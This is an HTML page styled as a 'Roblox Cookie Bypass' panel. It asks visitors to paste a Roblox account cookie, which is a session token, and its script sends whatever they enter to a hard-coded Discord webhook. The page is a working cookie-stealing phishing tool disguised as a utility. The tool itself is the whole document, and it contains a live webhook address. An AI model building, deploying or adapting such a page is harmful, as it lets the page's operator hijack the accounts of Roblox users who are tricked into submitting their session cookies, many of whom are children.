<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Roblox Cookie Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Roboto Mono', monospace;
      background: url("/mnt/data/259921db-a575-4c9f-87bc-bb143b26f08a.png") no-repeat center center fixed;
      background-size: cover;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.75);
      border-radius: 15px;
      padding: 30px 40px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
      width: 90%;
      max-width: 420px;
      text-align: center;
    }

    h1 {
      font-weight: 700;
      font-size: 2.4rem;
      margin-bottom: 20px;
      text-shadow: 2px 2px 5px #000;
    }

    textarea {
      width: 100%;
      height: 140px;
      resize: none;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      outline: none;
      box-sizing: border-box;
      font-family: 'Roboto Mono', monospace;
      background-color: #2c2c2c;
      color: #fff;
      box-shadow: inset 0 0 8px rgba(255, 255, 255, 0.2);
    }

    textarea::placeholder {
      color: #ccc;
    }

    button {
      margin-top: 18px;
      padding: 15px 20px;
      background-color: #e2231a;
      color: white;
      font-weight: 700;
      font-size: 1.1rem;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.3s ease;
      box-shadow: 0 0 10px #e2231a;
    }

    button:hover {
      background-color: #b51913;
    }

    .footer {
      margin-top: 15px;
      font-size: 13px;
      color: #bbb;
      font-style: italic;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Roblox Cookie Bypass</h1>
    <textarea id="message" placeholder="Enter your wanted Roblox account's Cookie"></textarea>
    <button onclick="sendMessage()">Send</button>
    <div class="footer">Made for Roblox users — use responsibly</div>
  </div>

  <script>
    function sendMessage() {
      const content = document.getElementById('message').value.trim();

      if (!content) {
        alert("Please enter a message.");
        return;
      }

      fetch("https://discord.com/api/webhooks/1378829108527632474/M06VJzuNE9_4xu6vdb8DZpEKQO9pn1iuHFpdO440UkvJxuL0cboI1aGHDQE2Ti7PGsPd", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content })
      }).then(res => {
        if (res.ok) {
          alert("✅ Message sent successfully!");
          document.getElementById('message').value = '';
        } else {
          alert("❌ Failed to send message.");
        }
      }).catch(err => {
        alert("❌ Error sending message.");
        console.error(err);
      });
    }
  </script>
</body>
</html>
